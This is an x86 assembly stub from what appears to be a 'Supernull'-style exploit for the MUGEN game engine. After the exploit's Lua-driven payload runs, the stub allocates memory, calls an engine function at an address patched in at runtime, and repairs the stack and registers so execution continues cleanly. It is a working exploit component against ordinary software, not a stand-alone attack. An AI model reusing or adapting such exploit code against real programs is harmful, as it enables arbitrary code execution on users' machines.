;;;; stub.asm: simple function which fixes up the stack and return values after the exploit is completed.
;;;;           unlike the classic 1.1 Supernull, I chose not to use a stage 2 payload in ASM. 100% of the payload is handled through Lua alone (except for this finalization).
;;;;           (assuming patches to existing MUGEN code don't count as part of the initial payload...)
[bits 32]

;; calloc(0x1, 0x4) to create space for a statedef list pointer
push 0x4
push 0x1
call dword [0x4DE1F8] ;; calloc function pointer (in both versions)
add esp,0x8
mov ebp,eax

;; invoke statedef structure populating function - params seem to be statedef structure size (0x9C) and number to allocate (0x01)
mov eax,0x9C
push eax
mov eax,0x01
call 0x55667788 ;; this gets fixed up through the Lua side based on MUGEN version - opted to do this to avoid having a versioned stub, though it makes editing this super annoying
add esp,0x04

;; save the statedef structure into the pointer we allocated earlier, then put into EAX to return
;; since we mangle it, EDI also needs to be zeroed to avoid a crash.
mov dword [ebp],eax
mov eax,ebp
xor edi,edi
add esp,0x184
mov esi,dword [esp+0x04]
ret